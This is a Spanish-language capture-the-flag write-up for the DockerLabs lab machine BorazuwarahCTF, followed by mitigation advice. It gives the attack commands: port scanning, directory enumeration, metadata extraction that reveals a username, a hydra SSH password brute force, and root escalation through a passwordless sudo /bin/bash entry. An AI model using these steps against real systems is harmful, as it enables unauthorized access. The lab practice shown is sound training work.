# Writeup: BorazuwarahCTF

- **Máquina:** BorazuwarahCTF (DockerLabs)
- **Enlace:** https://dockerlabs.es/maquinas/38/descargar
- **Dificultad:** Muy Fácil
- **Fecha:** 24 de Octubre 2026

---

## Objetivo
Acceder a privilegios `root` mediante esteganografía y ataque de fuerza bruta con `hydra`.

---

## Despliegue de la máquina
```bash
$ sudo bash auto_deploy.sh borazuwarahCTF.tar
```
<img width="710" height="344" alt="Captura de pantalla (259)" src="https://github.com/user-attachments/assets/e9d7c9a2-a885-4874-b1fc-451e38985d34" />

---

## 1. Reconocimiento
Se realizó escaneo de puertos con `nmap`, revelando dos puertos abiertos:

```bash
$ sudo nmap -p-  172.17.0.2
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh    
80/tcp open  http   
```
--- 

## 2. Identificación de vulnerabilidades
Si nos dirigimos a **http://172.17.0.2** en el navegador, podemos ver la imagen de un huevo. Los archivos como imagenes, videos o audios pueden contener metadatos que revelen información sensible o posibles vulnerabilidades. 
Se guardó la imagen para analizarla en la fase de Explotación.


---
## 3. Explotación
### 1. Enumeración web
Se ejecutó el siguiente comando para encontrar directorios o archivos ocultos en el servidor web:
```bash
$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt
```
<img width="553" height="334" alt="Captura de pantalla (268)" src="https://github.com/user-attachments/assets/8186c0ad-208c-45d5-b39c-c5c9d6fabc31" />

Se encontraron dos directorios: **.htacces** y **.htpasswd**, ambos con status `403 Forbbiden` por lo que esta linea de investigación queda descartada.


### 2. Extracción de metadato de imagen
Para estudiar los metadatos de la imagen del huevo, se utilizó la herramienta `exiftool`.

```bash
$ exiftool imagen.jpeg
```

Como resultado se obtuvo el nombre de un usuario válido:

<img width="600" height="46" alt="Captura de pantalla (269)" src="https://github.com/user-attachments/assets/a841245c-7a3e-4d58-9f75-467e708bb3df" />

### 3. Ataque de fuerza bruta a user borazuwarah
Se utilizó el siguiente comando de `hydra` para hacernos con las credenciales del usuario:

```bash
$ hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```
<img width="580" height="50" alt="Captura de pantalla (270)" src="https://github.com/user-attachments/assets/49bea63c-e485-4b8c-ac59-665d8e57aa2e" />

Sabiendo la contraseña, procedemos a conectarnos como el usuario borazuwarah utilizando `shh`:

```bash
$ ssh borazuwarah@172.17.0.2
```
```bash
borazuwarah@bdff3a8acd18:~$ whoami
borazuwarah
```

### 4. Escalada de privilegios 
Si usamos `sudo -l`, podemos ver que **borazuwarah** tiene permisos para ejecutar `/bin/bash` sin necesidad de contraseña: 

<img width="520" height="53" alt="Captura de pantalla (271)" src="https://github.com/user-attachments/assets/a4dce2a9-cc31-467f-b9ef-ea3869972976" />

Se ejecutó el siguiente comando para acceder a los privilegios `root`.

```bash
borazuwarah@bdff3a8acd18:~$ sudo -u root /bin/bash
```
<img width="372" height="62" alt="Captura de pantalla (272)" src="https://github.com/user-attachments/assets/d7dce83a-4930-4c3b-93b9-c8fdcb982773" />


---
## Acciones de mitigación
- **Escalada de privilegios al ejecutar `/bin/bash`**: Aplicar principio de menor privilegio o retirar de sudoers.
- **Contraseña débil vulnerabe a ataques de fuerza bruta**: Aplicar políticas de contraseñas más seguras e implementar verificación en dos pasos (MFA).
- **Metadatos de imagen que revelan existencia de usuario válido**: Usar `exiftool -all= -overwrite_original` para eliminar información sensible de una imagen antes de subirla a internet.
---
## Conclusión
La máquina BorazuwarahCTF permite aprender a extraer y analizar los metadatos de un archivo. 
